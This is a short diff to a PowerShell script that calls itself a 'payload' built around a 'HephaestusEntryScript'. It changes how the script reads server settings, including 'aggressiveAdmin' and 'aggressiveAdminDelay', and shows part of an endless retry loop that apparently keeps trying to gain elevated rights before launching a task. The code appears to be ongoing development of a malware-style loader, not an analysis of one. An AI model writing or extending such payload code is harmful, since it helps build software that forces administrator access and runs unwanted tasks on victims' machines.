@@ -2,6 +2,7 @@
 ###head
 
 . ./utils.ps1
+. ./consts_body.ps1
 
 function GetLocalScriptPath {
     param
@@ -85,14 +86,14 @@ function Main
         if (-not (IsElevated)) {
             $selfPath = $script:HephaestusEntryScript
             if (-not [string]::IsNullOrWhiteSpace($selfPath) -and (Test-Path -LiteralPath $selfPath)) {
-                if (-not (Test-Path variable:global:server)) {
-                    writedbg "Main: FATAL global:server is missing - misbuilt or corrupt payload; aborting (no task launch)." -ForegroundColor Red
+                if (-not (Test-Path variable:server)) {
+                    writedbg "Main: FATAL server config is missing - misbuilt or corrupt payload; aborting (no task launch)." -ForegroundColor Red
                     return
                 }
                 else {
-                    $delaySec = [int]$global:server.aggressiveAdminDelay
+                    $delaySec = [int]$server.aggressiveAdminDelay
                     if ($delaySec -lt 0) { $delaySec = 0 }
-                    $aggressiveElevRetry = [bool]$global:server.aggressiveAdmin
+                    $aggressiveElevRetry = [bool]$server.aggressiveAdmin
                     if ($aggressiveElevRetry) {
                         $attempt = GetArgInt("attempt")
                         while ($true) {
